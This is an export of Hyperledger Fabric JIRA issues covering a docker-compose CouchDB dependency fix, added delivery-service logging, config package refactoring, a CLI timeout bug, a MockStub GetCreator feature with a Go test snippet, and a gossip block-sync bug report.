      - CORE_LOGGING_PEER=debug
      - CORE_CHAINCODE_LOGGING_LEVEL=DEBUG
      - CORE_PEER_LOCALMSPID=Org1MSP
      - CORE_PEER_MSPCONFIGPATH=/etc/hyperledger/msp/peer/
      - CORE_PEER_ADDRESS=peer0.org1.example.com:7051
      # # the following setting starts chaincode containers on the same
      # # bridge network as the peers
      # # https://docs.docker.com/compose/networking/
      - CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=${COMPOSE_PROJECT_NAME}_basic
      - CORE_LEDGER_STATE_STATEDATABASE=CouchDB
      - CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=couchdb:5984
    working_dir: /opt/gopath/src/github.com/hyperledger/fabric
    command: peer node start
    # command: peer node start --peer-chaincodedev=true
    ports:
      - 7051:7051
      - 7053:7053
    volumes:
        - /var/run/:/host/var/run/
        - ./crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/msp:/etc/hyperledger/msp/peer
        - ./crypto-config/peerOrganizations/org1.example.com/users:/etc/hyperledger/msp/users
        - ./config:/etc/hyperledger/configtx
    depends_on:
      - orderer.example.com
    networks:
      - basic
{code}

Therefore need to add {{couchdb}} into {{depends_on}} section to make sure couchdb started prior to the peer container

{code}
    depends_on:
      - orderer.example.com
      - couchdb
{code}

",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc3j:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Aug/17 9:31 PM;C0rWin;https://gerrit.hyperledger.org/r/#/c/12179/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add logging to deliverservice/client.go,FAB-5633,19978,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,06/Aug/17 9:00 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,12/Aug/17 10:39 PM,v1.0.0,v1.0.1,,v1.0.2,v1.1.0,fabric-peer,,,,,,0,,,,,,,"The deliveryservice/client.go stores retry logic that plays a role when the ordering service node is unreachable or malfunctioning. 

It lacks logging, and thus makes it hard to analyze postmortem and live situations.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc3z:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Aug/17 9:12 PM;yacovm;https://gerrit.hyperledger.org/r/#/c/12181/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update examples/cluster to point to new location of configtxgen,FAB-5634,19979,19557,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,06/Aug/17 9:12 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Sep/17 5:34 PM,,,,,,fabric-samples,,,,,,0,,,,,,,FAB-5524 moved the location of the configtxgen tool.  Need to update the Makefile for the cluster example to point to the new location in the source tree,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc47:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Aug/17 9:24 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/12185/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Require Docker 17.06.0 or later and Docker Compose 1.14 or later,FAB-5635,19980,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,mastersingh24,mastersingh24,06/Aug/17 10:55 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,14/Sep/17 1:07 AM,,,,v1.1.0,,fabric-build,,,,,,0,,,,,,,"There are a number of things we can take advantage of in the latest release of Docker and Docker Compose:

1) Multi-stage builds in a single Dockerfile

2) Support for Docker Swarm

3) Support for Docker secrets (w/o being in swarm mode)",,harsha544,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyc4f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,harsha544,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Sep/17 1:04 AM;rameshthoomu;newer docker version 17.06.02-ce and docker-compose version 1.16 has been updated in all x86_64 production minions.;;;","16/Sep/17 10:31 PM;mastersingh24;Awesome;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
process CONFIG block to extract RSCC state info,FAB-5636,19981,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,muralisr,muralisr,07/Aug/17 12:04 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Aug/17 10:29 PM,,,,,,fabric-peer,,,,,,0,,,,,,,"State validation and injection processes ENDORSER type transactions only. We need to extend state validation to populate RSCC with data from genesis config block at Join time.

This should also ignore RSCC config information in channel config update  transactions happening post Join.",,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc4n:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create a Resource config tree for specfying resource policies,FAB-5637,19982,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,muralisr,muralisr,07/Aug/17 4:31 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Aug/17 10:29 PM,,,,,,fabric-peer,,,,,,0,,,,,,,"The resource configuration should be modeled after the channel configuration
 * design / code reuse
 * tooling reuse",,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5645,,,,,,,FAB-5584,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc4v:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Ledger storage,FAB-5638,19983,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,07/Aug/17 5:14 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,16/Aug/17 2:31 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,Provide functions that takes care of committing block and privatedata as an atomic operation,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc53:",,,,,,,,,,,,,,,,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The default CLI timeout is wrong.,FAB-5640,19985,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,TopJohn,TopJohn,07/Aug/17 12:38 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,04/Dec/17 12:15 AM,v1.0.0,,,v1.0.5,v1.1.0,fabric-samples,,,,,,0,fabric-cli,,,,,,"CLI timeout duration is in second not in microseconds.The defaults to 10000 ,it means the CLI container should exit after 10000 seconds,I think the ordinal design is 10 seconds eq 10000 millseconds,so I suggest to set 10 seconds.",,denyeart,mastersingh24,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc5j:",,,,,,,,,,,,,,,,,,,,,,,denyeart,mastersingh24,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Nov/17 9:48 PM;mastersingh24;[~TopJohn]  - Do you want to fix this?  If not, just assign it to me.  I have a fix ready anyway;;;","27/Nov/17 1:21 PM;denyeart;[~TopJohn] Do you intend to fix?;;;","03/Dec/17 11:37 PM;mastersingh24;https://gerrit.hyperledger.org/r/15885   (master)
https://gerrit.hyperledger.org/r/15883   (release);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
As an infrastructure developer i want to have limited waiting time for a tx to be included in the ledger,FAB-5642,19987,,Epic,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,elli-androulaki,elli-androulaki,07/Aug/17 7:57 PM,23/Jan/20 6:58 AM,28/Oct/23 3:00 AM,23/Jan/20 6:58 AM,,,,Future,,fabric-crypto,,,,,,0,stale-item,,,,,,"Many applications require that they have a definite answer from some point onwards on whether their transaction will ever be included in the ledger.

For example, a client has submitted a transaction and after an hour the transaction has not appeared to the peers that client maintains. 

We can easily do this 

 - (assuming there is no real-world time in the ledger) by leveraging epochs, ie., logical clock set/updated via the block counts

 - (assuming there is a real-world time in ledger) by leveraging the ledger time. 

The idea is that we know that a tx will be included in the ledger if and only if the time included in the tx (and set by the endorsers) is consistent with the time of the ledger. Again, this ""time"" can be logical (e.g., epochs), or real-world (by leveraging real-world time of the endorsers, and the ledger).

 ",,ChristopherFerris,elli-androulaki,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,Unset,ghx-label-9,,Enable an upper bound of waiting time for a tx to be included in ledger,To Do,,,Unset,,,,"1|hzyc5z:",,,,Unset,Unset,,,,,,,,,,,,,,,,,,ChristopherFerris,elli-androulaki,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Jul/18 9:43 PM;ChristopherFerris;[~elli-androulaki] is this still needed?;;;","23/Jan/20 6:58 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric unit-tests are taking nearly 3 hrs to complete in x86_64 build nodes,FAB-5643,19988,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,rameshthoomu,rameshthoomu,rameshthoomu,07/Aug/17 9:16 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Aug/17 10:38 PM,v1.0.0-rc1,,,v1.0.1,v1.0.2,fabric-build,fabric-ci,,,,,0,peer,,,,,,"Observed fabric unit-tests are taking more than 3 hr to complete after merge of this patch [https://gerrit.hyperledger.org/r/#/c/12141/|https://gerrit.hyperledger.org/r/#/c/12141/.] Verify job of this patch also took more than 2 hr 30 mins where as the average build time is 50 mins. See the verify job of this patch 

https://jenkins.hyperledger.org/job/fabric-verify-x86_64/14995/consoleFull

didn't see this error in z build machines but it's repeating in x86_64 build machines.",Jenkins x86_64,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc6f:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Aug/17 10:20 PM;rameshthoomu;Verified few more builds and observed all tests on x86_64 build nodes are failing because of slowness in the builds. [~ryjones] [~jwagantall] Could you please check why x86_64 builds are taking longer time to process the requests.

Note: Same builds are working as expected in `z` platform.;;;","08/Aug/17 10:38 PM;rameshthoomu;This issue has been fixed by @manser from LF infra team. Chat message is here:

[ ](https://chat.hyperledger.org/channel/infra-support?msg=BmBFnGtBE68h7c97H) @mnaser. Closing this issue now;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement GetCreator() method of MockStub,FAB-5644,19992,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yuki-kon,newint,newint,07/Aug/17 10:14 PM,19/Jan/19 6:19 AM,28/Oct/23 3:00 AM,17/Jan/19 4:50 AM,v1.1.0,,,,,,,,,,,2,MembershipServices,,,,,,"h2. Description

In order to improve abilities of unit testing, an implementation of [https://github.com/hyperledger/fabric/blob/release/core/chaincode/shim/mockstub.go#L281] is suggested.
 Having possibility to indicate transaction creator, will permit to test functionality which depends on MSP ID.
h2. Implementation Details
 # New *creator* field in MockStub
 # New method *SetCreator*
{code:java}
SetCreator(si *msp.SerializedIdentity)
if (si == nil) => a default one will be generated.
{code}
 # GetCreator will return *creator* field

h2. Deliverables
 * Implement *SetCreator()*
 * Implement *GetCreator()* ([github|https://github.com/hyperledger/fabric/blob/release/core/chaincode/shim/mockstub.go#L281])",,angelo.decaro,dainliff,edevil,lmars,newint,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-13769,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyc6n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,angelo.decaro,dainliff,edevil,lmars,newint,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Jun/18 2:59 PM;dainliff;[~newint] has any work been done on this? If not I'd be happy to take over this issue as we need it for a project we're on.;;;","11/Jun/18 4:16 PM;newint;Hello [~dainliff], sorry for delay in response. No work was done on this topic, so you can take it.
I started to implement it, but then I realized that there is another more flexible way to test. 
I created my ownMockStub, inserted in it shimMockStub and implemented in ownMockStub all necessary methods which I wanted.;;;","09/Aug/18 10:42 PM;edevil;The ABAC-related functions in the ""cid"" module rely on an implementation of getCreator() by the stub [https://github.com/hyperledger/fabric/blob/release-1.2/core/chaincode/lib/cid/cid.go#L173.] Without this support in MockStub we are unable to test chaincodes that want to make use of ABAC.

On another note, [~newint], are you able to share the code that you ended up using? Thanks.;;;","10/Aug/18 6:38 PM;newint;Hello, [~edevil]
That test code was written previous year during my work in IBM.
You can ask [~angelo.decaro]  or Jens (in his team) for creator mocking code share.
I will tell them about your request.

Best regards,
Ilie
;;;","10/Aug/18 6:41 PM;edevil;Thank you [~newint]. Hello [~angelo.decaro]. :);;;","10/Aug/18 8:58 PM;angelo.decaro;Hi [~edevil], why do you want to pass an msp.SerializedIdentity rather than just []byte?;;;","10/Aug/18 9:17 PM;edevil;Hello [~angelo.decaro]. That was [~newint]'s proposal, I think.

I would just like a way to use MockStub to test chaincode methods that make use of the `cid` module for ABAC.;;;","14/Nov/18 7:04 AM;yuki-kon;Hello [~edevil] and [~angelo.decaro]. I also want to use MockStub to test chaincode with ABAC. I added some modification to mockstub.go and used it for a chaincode with ABAC.
Can I take this JIRA and submit a CR? I will also submit a sample test code for fabric-samples/chaincode/abac.

+Change in fabric/core/chaincode/shim/mockstub.go+

Add `Creator []byte` to the struct `MockStub`.
https://github.com/hyperledger/fabric/blob/master/core/chaincode/shim/mockstub.go#L29-L70

Implement GetCreator(). This function returns stub.Creator.
https://github.com/hyperledger/fabric/blob/master/core/chaincode/shim/mockstub.go#L354-L357

+Usage in unit test for Chaincode with ABAC.+
In the test code, []byte of identity(cert) is passed. The identity and mspID are set to the creator. Chaincode uses the creator in the unit test.

{code}
func TestAbac_Init(t *testing.T) {
                scc := new(SimpleChaincode)
                stub := shim.NewMockStub(""abac"", scc)

                sid := &msp.SerializedIdentity{Mspid: ""org1MSP"", IdBytes: []byte(Cert)}
                b, err := proto.Marshal(sid)
                if err != nil {
                                t.FailNow()
                }
                stub.Creator = b

                checkInit(t, stub, [][]byte{[]byte(""init""), []byte(""A""), []byte(""123""), []byte(""B""), []byte(""234"")})
}
{code};;;","16/Jan/19 2:57 AM;yuki-kon;I posted a CR. https://gerrit.hyperledger.org/r/#/c/28744/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Split configtx processing and channelconfig dependency.,FAB-5645,20010,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,08/Aug/17 1:57 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,22/Aug/17 4:29 AM,,,,v1.1.0,,fabric-orderer,fabric-peer,,,,,0,common-components,,,,,,"The current configtx code was written under the assumption that it was managing a channel configuration.  Although there is some abstraction via the use of interfaces to make unit testing easier, it's not currently possible to use the configtx processing for something like the RSCC support.

This story is to remove the channel config specifics from the configtx package, and to factor the common components out of the channel config package into a common config package.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5637,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyc8f:",,,,Unset,,,,,,,8.0,Unset,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Aug/17 2:03 AM;jyellick;This should be closed once all of the sub-tasks are done.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move config code to config/channel,FAB-5646,20012,20010,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,08/Aug/17 2:07 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,22/Aug/17 4:29 AM,,,,,,,,,,,,0,,,,,,,"Because the bulk of the config code is channel specific, it makes sense to first move the channel config to its own dir, then move back the common components to the top level config dir.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc8v:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Split config common components from channelconfig,FAB-5647,20013,20010,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,08/Aug/17 2:10 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,22/Aug/17 4:29 AM,,,,,,,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc93:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Extract initializer from configtx to channel config,FAB-5648,20014,20010,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,08/Aug/17 2:18 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,22/Aug/17 4:29 AM,,,,,,,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc9b:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Invert configtx channel config embedding.,FAB-5649,20016,20010,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,08/Aug/17 5:37 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,22/Aug/17 4:29 AM,,,,,,,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc9r:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move template channel creation from configtx,FAB-5650,20017,20010,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,08/Aug/17 5:50 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,22/Aug/17 4:29 AM,,,,,,,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc9z:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Gossip-non-leader peer unexpectedly receives blocks from a source other than gossip-leader-peer,FAB-5651,20018,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,gennadyl,AdnanChoudhury,AdnanChoudhury,08/Aug/17 6:35 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,28/Aug/17 11:37 PM,,,,,,fabric-gossip,,,,,,0,gossip,gossip_component,quality,,,,"A non-leader peer is expected to receive blocks only from the leader peer, but it is observed that it receives blocks from the orderer directly.

*Steps:*
 1) Spin up a 2org-4peer network (please see attached docker-compose and configtx file). peer0 of both org is defined as anchor and leader of corresponding org. Gossip leader election is false in all 4 peers.
 2) Install and invoke chaincode ""example02""
 3)After few seconds, stop all the peers except org2 leader (i.e. peer0.org2.example.com is alive, others 3 peers are stopped).
 4) 3 transactions on chaincode via peer0org2.
 5) In the peer0org2, Corrupt the last block in ledgerfile (/var/hyperledger/production/ledgersData/chains/chains/behavesystest/blockfile_000000) 
 6) Bring back up the non-leader of org2 (peer1Org2.example.com) 
 7) Query this non-leader peer.

*Expected*: 
 The non-leader is supposed to get blocks from the leader only, and thus should have a corrupted/incomplete ledger.

*Observed*:
 The non-leader peer contains a correct/complete ledger. If the orderer is turned off before non-leader comes back up, it ends up with the expected in-complete ledger, which indicates that  its getting the blocks directly from the orderer.

Non-leader and leader peer logs are attached.",,AdnanChoudhury,gennadyl,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Aug/17 6:35 AM;AdnanChoudhury;configtx.yaml;https://jira.hyperledger.org/secure/attachment/11840/configtx.yaml","08/Aug/17 6:35 AM;AdnanChoudhury;docker-compose-solo.yml;https://jira.hyperledger.org/secure/attachment/11839/docker-compose-solo.yml","10/Aug/17 12:40 AM;AdnanChoudhury;leader-ledger_2ndrun;https://jira.hyperledger.org/secure/attachment/11852/leader-ledger_2ndrun","10/Aug/17 12:40 AM;AdnanChoudhury;leader-ledger_3rdrun;https://jira.hyperledger.org/secure/attachment/11853/leader-ledger_3rdrun","08/Aug/17 6:33 AM;AdnanChoudhury;leader-log.txt;https://jira.hyperledger.org/secure/attachment/11842/leader-log.txt","10/Aug/17 12:40 AM;AdnanChoudhury;leader-log_2ndrun.txt;https://jira.hyperledger.org/secure/attachment/11854/leader-log_2ndrun.txt","10/Aug/17 12:40 AM;AdnanChoudhury;leader-log_3rdrun.txt;https://jira.hyperledger.org/secure/attachment/11855/leader-log_3rdrun.txt","10/Aug/17 12:40 AM;AdnanChoudhury;non-leader-ledger_2ndrun;https://jira.hyperledger.org/secure/attachment/11856/non-leader-ledger_2ndrun","10/Aug/17 12:40 AM;AdnanChoudhury;non-leader-ledger_3rdrun;https://jira.hyperledger.org/secure/attachment/11857/non-leader-ledger_3rdrun","08/Aug/17 6:33 AM;AdnanChoudhury;non-leader-log.txt;https://jira.hyperledger.org/secure/attachment/11841/non-leader-log.txt","10/Aug/17 12:40 AM;AdnanChoudhury;non-leader-log_2ndrun.txt;https://jira.hyperledger.org/secure/attachment/11858/non-leader-log_2ndrun.txt","10/Aug/17 12:40 AM;AdnanChoudhury;non-leader-log_3rdrun.txt;https://jira.hyperledger.org/secure/attachment/11859/non-leader-log_3rdrun.txt",,,,,,,,,,,,,,,,,,"1|hzyca7:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,gennadyl,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Aug/17 6:38 AM;AdnanChoudhury;[~C0rWin];;;","10/Aug/17 12:40 AM;AdnanChoudhury;Attaching logs from 2 more runs, they differ in how the ledgerfile is edited in step 5:
1) in the 2nd run, In the leader peer ledger file,  values of one of the invokes is edited.
2) in the 3rd run, In the leader peer ledger file,  The entire ledger file contents are deleted except 1st line.

The non-leader, in both cases, end up with error-free ledger (ledgers for both runs are also attached.);;;","16/Aug/17 9:57 PM;gennadyl;Hi [~AdnanChoudhury]. Based what I saw in logs, peer1Org2.example.com get missing blocks using pull mechanism from peer0Org2.example.com, so system works as expected. Pull mechanism keep in-memory blocks cache (for latest blocks) and this way not affected by blocks stored on disk.;;;","16/Aug/17 10:03 PM;gennadyl;In any case, non-leader can't have corrupted ledger, only in-complete - each block validated in state transfer/pull upon receive.  
Here how last block verification fails during state transfer:

017-08-07 21:30:14.087 UTC [gossip/state] handleStateResponse -> WARN a37 Error verifying block with sequence number 4, due to Header.DataHash is different from Hash(block.Data) for block with id [4] on channel [behavesystest]
